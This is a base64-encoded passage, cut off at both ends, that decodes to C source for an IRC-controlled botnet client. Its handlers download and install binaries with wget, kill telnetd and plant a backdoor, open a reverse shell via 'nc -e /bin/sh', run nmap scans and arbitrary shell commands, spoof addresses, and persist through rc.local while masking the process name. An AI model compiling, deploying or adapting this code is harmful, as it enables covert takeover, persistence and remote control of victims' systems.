2hhciBidWZbMTAyNF07CiAgICAgICAgICAgICAgICAgICAgICAgIEZJTEUgKmNvbW1hbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtZm9yayhzZW5kZXIpICE9IDApIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGJ1ZiwwLDEwMjQpOwogICAgICAgICAgICAgICAgIAlzcHJpbnRmKGJ1ZiwiZXhwb3J0IFBBVEg9L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Zhci9iaW47ZXhwb3J0IHVybD0lcztleHBvcnQgbmFtZT1gZWNobyBcIiR1cmxcIiB8IHNlZCAncyMuKi8jIydgOyhbIC1lIC92YXIvYmluLyRuYW1lIF0pICYmIGVjaG8gJG5hbWUgZXhpc3RzIHNvIHdlIGRlbGV0ZSBpdC4uLiAmJiBybSAvdmFyL2Jpbi8kbmFtZSAmJiBjZCAvdG1wICYmIHdnZXQgLU8gJG5hbWUgJHVybCAmJiBjaG1vZCAreCAkbmFtZSAmJiBtdiAkbmFtZSAvdmFyL2JpbiAmJiAoWyAtZiAvdmFyL2Jpbi8kbmFtZSBdICYmIGxzIC1sIC92YXIvYmluLyRuYW1lKSB8fCBlY2hvIFwiJG5hbWUgZG9lc250IGV4aXN0LCBwZXJoYXBzIHlvdSBtZWFuIElOU1RBTEw/XCIiLG1lc3NhZ2UrMTApOwoJCQljb21tYW5kPXBvcGVuKGJ1ZiwiciIpOwogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSghZmVvZihjb21tYW5kKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbXNldChidWYsMCwxMDI0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmZ2V0cyhidWYsMTAyNCxjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6JXNcbiIsc2VuZGVyLGJ1Zik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xlZXAoMSk7CgkJCX0KICAgICAgICAgICAgICAgICAgICAgICAgcGNsb3NlKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICBleGl0KDApOwogICAgICAgICAgICAgICAgfQoKLy8gTE9DS1VQIDxodHRwOnNlcnZlci9iYWNrZG9vcj4gIChUaGlzIGtpbGxzIHRlbG5ldGQgYW5kIGluc3RhbGxzIHlvdXIgY3VzdG9tIGJhY2tkb29yIGJpbmFyeSwgd2hpY2ggc2hvdWxkIGhhdmUgc29tZSBraW5kIG9mIGF1dGguIFRoaXMgaXMgcHJvYiBzb21ldGhpbmcgZWxzZSB0aGF0IHdvdWxkIGJlIGNvb2wgdG8gaGF2ZSBidWlsdCBpbiB0byBlbGltaWF0ZSB0aGUgZGVwZW5kZW5jeQoKCQlpZiAoIXN0cm5jbXAobWVzc2FnZSwiTE9DS1VQICIsNykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY2hhciBidWZbMTAyNF07CiAgICAgICAgICAgICAgICAgICAgICAgIEZJTEUgKmNvbW1hbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtZm9yayhzZW5kZXIpICE9IDApIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGJ1ZiwwLDEwMjQpOwogICAgICAgICAgICAgICAgIAlzcHJpbnRmKGJ1ZiwiZXhwb3J0IFBBVEg9L3Zhci9iaW46L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW47ZXhwb3J0IEhPTUU9L3RtcDtbICEgLWYgL3Zhci9iaW4vYmQgXSAmJiBjZCAvdmFyL2Jpbjt3Z2V0IC1PIGJkICVzO2NobW9kICt4IC92YXIvYmluL2JkOyhraWxsYWxsIC05IHRlbG5ldGQgfHwga2lsbCAtOSB0ZWxuZXRkKSAmJiAobm9odXAgYmQgfHwgdHJhcCAnJyAxIDIgL3Zhci9iaW4vYmQgJikiLG1lc3NhZ2UrNyk7CgkJCWNvbW1hbmQ9cG9wZW4oYnVmLCJyIik7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCFmZW9mKGNvbW1hbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGJ1ZiwwLDEwMjQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZnZXRzKGJ1ZiwxMDI0LGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDolc1xuIixzZW5kZXIsYnVmKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzbGVlcCgxKTsKCQkJfQogICAgICAgICAgICAgICAgICAgICAgICBwY2xvc2UoY29tbWFuZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CgovLyAhKiBSU0hFTEwgc2VydmVyLmNvbSA0NDQ0IChyZXZlcnNlIHNoZWxsIHZpYSBuYy4gV2UgbmVlZCBhIGJ1aWx0IGluIHJldmVyZXNlIHNoZWxsIGZ1bmN0aW9tbiB0byBlbGltaW5pYXRlIHRoaXMgZGVwZW5kZW5jeSB0b28uIEFsbCBpbiBnb29kIHRpbWUuKQoJCWlmICghc3RybmNtcChtZXNzYWdlLCJSU0hFTEwgIiw2KSkgewogICAgICAgICAgICAgICAgICAgICAgICBjaGFyIGJ1ZlsxMDI0XTsKICAgICAgICAgICAgICAgICAgICAgICAgRklMRSAqY29tbWFuZDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG1mb3JrKHNlbmRlcikgIT0gMCkgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgICAgICBtZW1zZXQoYnVmLDAsMTAyNCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHNwcmludGYoYnVmLCJleHBvcnQgSE9NRT0vdG1wO2V4cG9ydCBQQVRIPS92YXIvYmluOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluO3RyYXAgJycgMSAyOyBzaCAtYyAnbmMgJXMgLWUgL2Jpbi9zaCAnJiIsbWVzc2FnZSs2KTsKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZD1wb3BlbihidWYsInIiKTsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUoIWZlb2YoY29tbWFuZCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW1zZXQoYnVmLDAsMTAyNCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmdldHMoYnVmLDEwMjQsY29tbWFuZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOiVzXG4iLHNlbmRlcixidWYpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwKDEpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHBjbG9zZShjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgwKTsKICAgICAgICAgICAgICAgIH0KCi8vU0NBTiAoY2FsbHMgdGhlIG5tYXAgd3JhcHBlciBzY3JpcHQuIEV2ZW50YXVsbHkgdGhpcyBkZXBlbmRlbmN5IHdpbGwgYmUgcmVtb3ZlZCB0b28uKQoJCWlmICghc3RybmNtcChtZXNzYWdlLCJTQ0FOICIsNSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY2hhciBidWZbMTAyNF07CiAgICAgICAgICAgICAgICAgICAgICAgIEZJTEUgKmNvbW1hbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtZm9yayhzZW5kZXIpICE9IDApIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGJ1ZiwwLDEwMjQpOwogICAgICAgICAgICAgICAgICAgICAgICBzcHJpbnRmKGJ1ZiwiZXhwb3J0IEhPTUU9L3RtcDtleHBvcnQgUEFUSD0vdmFyL2JpbjovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjsoKFsgISAteCAvdmFyL2Jpbi9zY2FuIF0gfHwgWyAhIC14IC92YXIvYmluL25tYXAgXSkgJiYgZWNobyBcIkkgYW0gbWlzc2luZyBlaXRoZXIgc2NhbiBvciBubWFwLCBhbmQgU2hlbGx6cnVzIHdhcyBvbiBYYW5heCB3aGVuIGhlIHdyb3RlIHRoaXMsIHNvIHlvdSBuZWVkIHRvIGRvIElOU1RBTEwgaHR0cDpceDJmXHNlcnZlci9ubWFwIGFuZCBJTlNUQUxMIGh0dHA6XHgyZlx4MmZzZXJ2ZXIvc2NhbiBmaXJzdC4uLlwiICYmIChbIC1mIC92YXIvYmluL25tYXAgXSAmJiBscyAtbCAvdmFyL2Jpbi9ubWFwKSAmJiAoWyAtZiAvdmFceDcyL2Jpbi9zY2FuIF0gJiYgbHMgLWwgL3Zhci9iaW4vc2NhbikgfHwgc2NhbiAlcykiLG1lc3NhZ2UrNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ9cG9wZW4oYnVmLCJyIik7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCFmZW9mKGNvbW1hbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGJ1ZiwwLDEwMjQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZnZXRzKGJ1ZiwxMDI0LGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDolc1xuIixzZW5kZXIsYnVmKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzbGVlcCgxKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBwY2xvc2UoY29tbWFuZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CgovLyAhKiBCQVNIIDxjbWQ+IChBc3N1bWVzIGJhc2ggbGl2ZXMgaW4gL3Zhci9iaW4pCgkJaWYgKCFzdHJuY21wKG1lc3NhZ2UsIkJBU0ggIiw1KSkgewogICAgICAgICAgICAgICAgICAgICAgICBjaGFyIGJ1ZlsxMDI0XTsKICAgICAgICAgICAgICAgICAgICAgICAgRklMRSAqY29tbWFuZDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG1mb3JrKHNlbmRlcikgIT0gMCkgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgICAgICBtZW1zZXQoYnVmLDAsMTAyNCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHNwcmludGYoYnVmLCJleHBvcnQgSE9NRT0vdG1wO2V4cG9ydCBTSEVMTD0vdmFyL2Jpbi9iYXNoO2V4cG9ydCBQQVRIPS9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi92YXIvYmluOyVzIixtZXNzYWdlKzUpOwogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kPXBvcGVuKGJ1ZiwiciIpOwogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSghZmVvZihjb21tYW5kKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbXNldChidWYsMCwxMDI0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmZ2V0cyhidWYsMTAyNCxjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6JXNcbiIsc2VuZGVyLGJ1Zik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xlZXAoMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcGNsb3NlKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICBleGl0KDApOwoKCQl9CgogICAgICAgICAgICAgICAgbT1zdHJsZW4obWVzc2FnZSk7CiAgICAgICAgICAgICAgICBmb3IgKGk9MDtpPG07aSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgqbWVzc2FnZSA9PSAnICcgfHwgKm1lc3NhZ2UgPT0gMCkgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWVbaV09Km1lc3NhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UrKzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGZvciAoaT0wO2k8c3RybGVuKG1lc3NhZ2UpO2krKykgaWYgKG1lc3NhZ2VbaV0gPT0gJyAnKSBudW1fcGFyYW1zKys7CiAgICAgICAgICAgICAgICBudW1fcGFyYW1zKys7CiAgICAgICAgICAgICAgICBpZiAobnVtX3BhcmFtcyA+IDEwKSBudW1fcGFyYW1zPTEwOwogICAgICAgICAgICAgICAgcGFyYW1zWzBdPW5hbWU7CiAgICAgICAgICAgICAgICBwYXJhbXNbbnVtX3BhcmFtcysxXT0iXDAiOwogICAgICAgICAgICAgICAgbT0xOwogICAgICAgICAgICAgICAgd2hpbGUgKCptZXNzYWdlICE9IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSsrOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAobSA+PSBudW1fcGFyYW1zKSBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChpPTA7aTxzdHJsZW4obWVzc2FnZSkgJiYgbWVzc2FnZVtpXSAhPSAnICc7aSsrKTsKICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zW21dPShjaGFyKiltYWxsb2MoaSsxKTsKICAgICAgICAgICAgICAgICAgICAgICAgc3RybmNweShwYXJhbXNbbV0sbWVzc2FnZSxpKTsKICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zW21dW2ldPTA7CiAgICAgICAgICAgICAgICAgICAgICAgIG0rKzsKICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSs9aTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGZvciAobT0wOyBmbG9vZGVyc1ttXS5jbWQgIT0gKGNoYXIgKikwOyBtKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFzdHJjYXNlY21wKGZsb29kZXJzW21dLmNtZCxuYW1lKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsb29kZXJzW21dLmZ1bmMoc29jayxzZW5kZXIsbnVtX3BhcmFtcy0xLHBhcmFtcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChpPTE7aTxudW1fcGFyYW1zO2krKykgZnJlZShwYXJhbXNbaV0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KfQp2b2lkIF8zNzYoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgY2hhciAqc3RyKSB7CiAgICAgICAgU2VuZChzb2NrLCJNT0RFICVzIC14aVxuIixuaWNrKTsKICAgICAgICBTZW5kKHNvY2ssIkpPSU4gJXMgOiVzXG4iLGNoYW4sa2V5KTsKICAgICAgICBTZW5kKHNvY2ssIldITyAlc1xuIixuaWNrKTsKfQp2b2lkIF9QSU5HKGludCBzb2NrLCBjaGFyICpzZW5kZXIsIGNoYXIgKnN0cikgewogICAgICAgIFNlbmQoc29jaywiUE9ORyAlc1xuIixzdHIpOwp9CnZvaWQgXzM1MihpbnQgc29jaywgY2hhciAqc2VuZGVyLCBjaGFyICpzdHIpIHsKICAgICAgICBpbnQgaSxkOwogICAgICAgIGNoYXIgKm1zZz1zdHI7CiAgICAgICAgc3RydWN0IGhvc3RlbnQgKmhvc3RtOwogICAgICAgIHVuc2lnbmVkIGxvbmcgbTsKICAgICAgICBmb3IgKGk9MCxkPTA7ZDw1O2QrKykgewogICAgICAgICAgICAgICAgZm9yICg7aTxzdHJsZW4oc3RyKSAmJiAqbXNnICE9ICcgJzttc2crKyxpKyspOyBtc2crKzsKICAgICAgICAgICAgICAgIGlmIChpID09IHN0cmxlbihzdHIpKSByZXR1cm47CiAgICAgICAgfQogICAgICAgIGZvciAoaT0wO2k8c3RybGVuKG1zZykgJiYgbXNnW2ldICE9ICcgJztpKyspOwogICAgICAgIG1zZ1tpXT0wOwogICAgICAgIGlmICghc3RyY2FzZWNtcChtc2csbmljaykgJiYgIXNwb29mc20pIHsKICAgICAgICAgICAgICAgIG1zZz1zdHI7CiAgICAgICAgICAgICAgICBmb3IgKGk9MCxkPTA7ZDwzO2QrKykgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKDtpPHN0cmxlbihzdHIpICYmICptc2cgIT0gJyAnO21zZysrLGkrKyk7IG1zZysrOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaSA9PSBzdHJsZW4oc3RyKSkgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZm9yIChpPTA7aTxzdHJsZW4obXNnKSAmJiBtc2dbaV0gIT0gJyAnO2krKyk7CiAgICAgICAgICAgICAgICBtc2dbaV09MDsKICAgICAgICAgICAgICAgIGlmICgobSA9IGluZXRfYWRkcihtc2cpKSA9PSAtMSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKGhvc3RtPWdldGhvc3RieW5hbWUobXNnKSkgPT0gTlVMTCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpJJ20gaGF2aW5nIGEgcHJvYmxlbSByZXNvbHZpbmcgbXkgaG9zdCwgc29tZW9uZSB3aWxsIGhhdmUgdG8gU1BPT0ZTIG1lIG1hbnVhbGx5LlxuIixjaGFuKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgbWVtY3B5KChjaGFyKikmbSwgaG9zdG0tPmhfYWRkciwgaG9zdG0tPmhfbGVuZ3RoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICgoY2hhciopJnNwb29mcylbM109KChjaGFyKikmbSlbMF07CiAgICAgICAgICAgICAgICAoKGNoYXIqKSZzcG9vZnMpWzJdPSgoY2hhciopJm0pWzFdOwogICAgICAgICAgICAgICAgKChjaGFyKikmc3Bvb2ZzKVsxXT0oKGNoYXIqKSZtKVsyXTsKICAgICAgICAgICAgICAgICgoY2hhciopJnNwb29mcylbMF09MDsKICAgICAgICAgICAgICAgIHNwb29mc209MjU2OwogICAgICAgIH0KfQp2b2lkIF80MzMoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgY2hhciAqc3RyKSB7CiAgICAgICAgZnJlZShuaWNrKTsKICAgICAgICBuaWNrPW1ha2VzdHJpbmcoKTsKfQp2b2lkIF9OSUNLKGludCBzb2NrLCBjaGFyICpzZW5kZXIsIGNoYXIgKnN0cikgewoJaW50IGk7CiAgICAgICAgZm9yIChpPTA7aTxzdHJsZW4oc2VuZGVyKSAmJiBzZW5kZXJbaV0gIT0gJyEnO2krKyk7CiAgICAgICAgc2VuZGVyW2ldPTA7CglpZiAoIXN0cmNhc2VjbXAoc2VuZGVyLG5pY2spKSB7CgkJaWYgKCpzdHIgPT0gJzonKSBzdHIrKzsKCQlpZiAobmljaykgZnJlZShuaWNrKTsKCQluaWNrPXN0cmR1cChzdHIpOwoJfQp9CnN0cnVjdCBNZXNzYWdlcyB7IGNoYXIgKmNtZDsgdm9pZCAoKiBmdW5jKShpbnQsY2hhciAqLGNoYXIgKik7IH0gbXNnc1tdID0gewogICAgICAgIHsgIjM1MiIsIF8zNTIgfSwKICAgICAgICB7ICIzNzYiLCBfMzc2IH0sCiAgICAgICAgeyAiNDMzIiwgXzQzMyB9LAogICAgICAgIHsgIjQyMiIsIF8zNzYgfSwKICAgICAgICB7ICJQUklWTVNHIiwgX1BSSVZNU0cgfSwKICAgICAgICB7ICJQSU5HIiwgX1BJTkcgfSwKCXsgIk5JQ0siLCBfTklDSyB9LAp7IChjaGFyICopMCwgKHZvaWQgKCopKGludCxjaGFyICosY2hhciAqKSkwIH0gfTsKdm9pZCBjb24oKSB7CiAgICAgICAgc3RydWN0IHNvY2thZGRyX2luIHNydjsKICAgICAgICB1bnNpZ25lZCBsb25nIGlwYWRkcixzdGFydDsKICAgICAgICBpbnQgZmxhZzsKICAgICAgICBzdHJ1Y3QgaG9zdGVudCAqaHA7CnN0YXJ0OgoJc29jaz0tMTsKCWZsYWc9MTsKCWlmIChjaGFuZ2VzZXJ2ZXJzID09IDApIHNlcnZlcj1zZXJ2ZXJzW3JhbmQoKSVudW1zZXJ2ZXJzXTsKCWNoYW5nZXNlcnZlcnM9MDsKICAgICAgICB3aGlsZSAoKHNvY2sgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPCAwKTsKCWlmIChpbmV0X2FkZHIoc2VydmVyKSA9PSAwIHx8IGluZXRfYWRkcihzZXJ2ZXIpID09IC0xKSB7CgkJaWYgKChocCA9IGdldGhvc3RieW5hbWUoc2VydmVyKSkgPT0gTlVMTCkgewoJCQlzZXJ2ZXI9TlVMTDsKCQkJY2xvc2Uoc29jayk7CgkJCWdvdG8gc3RhcnQ7CgkJfQoJCWJjb3B5KChjaGFyKilocC0+aF9hZGRyLCAoY2hhciopJnNydi5zaW5fYWRkciwgaHAtPmhfbGVuZ3RoKTsKCX0KCWVsc2Ugc3J2LnNpbl9hZGRyLnNfYWRkcj1pbmV0X2FkZHIoc2VydmVyKTsKICAgICAgICBzcnYuc2luX2ZhbWlseSA9IEFGX0lORVQ7CiAgICAgICAgc3J2LnNpbl9wb3J0ID0gaHRvbnMoNjY2Nyk7Cglpb2N0bChzb2NrLEZJT05CSU8sJmZsYWcpOwoJc3RhcnQ9dGltZShOVUxMKTsKCXdoaWxlKHRpbWUoTlVMTCktc3RhcnQgPCAxMCkgewoJCWVycm5vPTA7CgkJaWYgKGNvbm5lY3Qoc29jaywgKHN0cnVjdCBzb2NrYWRkciAqKSZzcnYsIHNpemVvZihzcnYpKSA9PSAwIHx8IGVycm5vID09IEVJU0NPTk4pIHsKCQkgICAgICAgIHNldHNvY2tvcHQoc29jayxTT0xfU09DS0VULFNPX0xJTkdFUiwwLDApOwoJCSAgICAgICAgc2V0c29ja29wdChzb2NrLFNPTF9TT0NLRVQsU09fUkVVU0VBRERSLDAsMCk7CgkJICAgICAgICBzZXRzb2Nrb3B0KHNvY2ssU09MX1NPQ0tFVCxTT19LRUVQQUxJVkUsMCwwKTsKCQkJcmV0dXJuOwoJCX0KCQlpZiAoIShlcnJubyA9PSBFSU5QUk9HUkVTUyB8fGVycm5vID09IEVBTFJFQURZKSkgYnJlYWs7CgkJc2xlZXAoMSk7Cgl9CglzZXJ2ZXI9TlVMTDsKCWNsb3NlKHNvY2spOwoJZ290byBzdGFydDsKfQoKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICAgICAgaW50IG9uLGk7CiAgICAgICAgY2hhciBjd2RbMjU2XSwqc3RyOwogICAgICAgIEZJTEUgKmZpbGU7CgojaWZkZWYgU1RBUlRVUAoJc3RyPSIvZXRjL3JjLmQvcmMubG9jYWwiOwoJZmlsZT1mb3BlbihzdHIsInIiKTsKCWlmIChmaWxlID09IE5VTEwpIHsKCQlzdHI9Ii9ldGMvcmMuY29uZiI7CgkJZmlsZT1mb3BlbihzdHIsInIiKTsKCX0KICAgICAgICBpZiAoZmlsZSAhPSBOVUxMKSB7CiAgICAgICAgICAgICAgICBjaGFyIG91dGZpbGVbMjU2XSwgYnVmWzEwMjRdOwogICAgICAgICAgICAgICAgaW50IGk9c3RybGVuKGFyZ3ZbMF0pLCBkPTA7CiAgICAgICAgICAgICAgICBnZXRjd2QoY3dkLDI1Nik7CiAgICAgICAgICAgICAgICBpZiAoc3RyY21wKGN3ZCwiLyIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKGFyZ3ZbMF1baV0gIT0gJy8nKSBpLS07CiAgICAgICAgICAgICAgICAgICAgICAgIHNwcmludGYob3V0ZmlsZSwiXCIlcyVzXCJcbiIsY3dkLGFyZ3ZbMF0raSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCFmZW9mKGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmdldHMoYnVmLDEwMjQsZmlsZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFzdHJjYXNlY21wKGJ1ZixvdXRmaWxlKSkgZCsrOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkID09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGSUxFICpvdXQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKGZpbGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dD1mb3BlbihzdHIsImEiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAob3V0ICE9IE5VTEwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZwdXRzKG91dGZpbGUsb3V0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZjbG9zZShvdXQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGZjbG9zZShmaWxlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgZmNsb3NlKGZpbGUpOwogICAgICAgIH0KI2VuZGlmCiAgICAgICAgaWYgKGZvcmsoKSkgZXhpdCgwKTsKI2lmZGVmIEZBS0VOQU1FCglzdHJuY3B5KGFyZ3ZbMF0sRkFLRU5BTUUsc3RybGVuKGFyZ3ZbMF0pKTsKICAgICAgICBmb3IgKG9uPTE7b248YXJnYztvbisrKSBtZW1zZXQoYXJndltvbl0sMCxzdHJsZW4oYXJndltvbl0pKTsKI2VuZGlmCiAgICAgICAgc3JhbmQoKHRpbWUoTlVMTCkgXiBnZXRwaWQoKSkgKyBnZXRwcGlkKCkpOwogICAgICAgIG5pY2s9bWFrZXN0cmluZygpOwogICAgICAgIGlkZW50PW1ha2VzdHJpbmcoKTsKICAgICAgICB1c2VyPW1ha2VzdHJpbmcoKTsKICAgICAgICBjaGFuPUNIQU47CglrZXk9S0VZOwoJc2VydmVyPU5VTEw7CnNhOgojaWZkZWYgSURFTlQKICAgICAgICBmb3IgKGk9MDtpPG51bXBpZHM7aSsrKSB7CiAgICAgICAgICAgICAgICBpZiAocGlkc1tpXSAhPSAwICYmIHBpZHNbaV0gIT0gZ2V0cGlkKCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAga2lsbChwaWRzW2ldLDkpOwoJCQl3YWl0cGlkKHBpZHNbaV0sTlVMTCxXTk9IQU5HKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CglwaWRzPU5VTEw7CgludW1waWRzPTA7CglpZGVudGQoKTsKI2VuZGlmCgljb24oKTsKICAgICAgICBTZW5kKHNvY2ssIk5JQ0sgJXNcblVTRVIgJXMgbG9jYWxob3N0IGxvY2FsaG9zdCA6JXNcbiIsbmljayxpZGVudCx1c2VyKTsKICAgICAgICB3aGlsZSgxKSB7CiAgICAgICAgICAgICAgICB1bnNpZ25lZCBsb25nIGk7CiAgICAgICAgICAgICAgICBmZF9zZXQgbjsKICAgICAgICAgICAgICAgIHN0cnVjdCB0aW1ldmFsIHR2OwogICAgICAgICAgICAgICAgRkRfWkVSTygmbik7CiAgICAgICAgICAgICAgICBGRF9TRVQoc29jaywmbik7CiAgICAgICAgICAgICAgICB0di50dl9zZWM9NjAqMjA7CiAgICAgICAgICAgICAgICB0di50dl91c2VjPTA7CiAgICAgICAgICAgICAgICBpZiAoc2VsZWN0KHNvY2srMSwmbiwoZmRfc2V0KikwLChmZF9zZXQqKTAsJnR2KSA8PSAwKSBnb3RvIHNhOwogICAgICAgICAgICAgICAgZm9yIChpPTA7aTxudW1waWRzO2krKykgaWYgKHdhaXRwaWQocGlkc1tpXSxOVUxMLFdOT0hBTkcpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICB1bnNpZ25lZCBpbnQgKm5ld3BpZHMsb247CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAob249aSsxO29uPG51bXBpZHM7b24rKykgcGlkc1tvbi0xXT1waWRzW29uXTsKCQkJcGlkc1tvbi0xXT0wOwogICAgICAgICAgICAgICAgICAgICAgICBudW1waWRzLS07CiAgICAgICAgICAgICAgICAgICAgICAgIG5ld3BpZHM9KHVuc2lnbmVkIGludCopbWFsbG9jKChudW1waWRzKzEpKnNpemVvZih1bnNpZ25lZCBpbnQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChvbj0wO29uPG51bXBpZHM7b24rKykgbmV3cGlkc1tvbl09cGlkc1tvbl07CiAgICAgICAgICAgICAgICAgICAgICAgIGZyZWUocGlkcyk7CiAgICAgICAgICAgICAgICAgICAgICAgIHBpZHM9bmV3cGlkczsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChGRF9JU1NFVChzb2NrLCZuKSkgewogICAgICAgICAgICAgICAgICAgICAgICBjaGFyIGJ1Zls0MDk2XSwgKnN0cjsKICAgICAgICAgICAg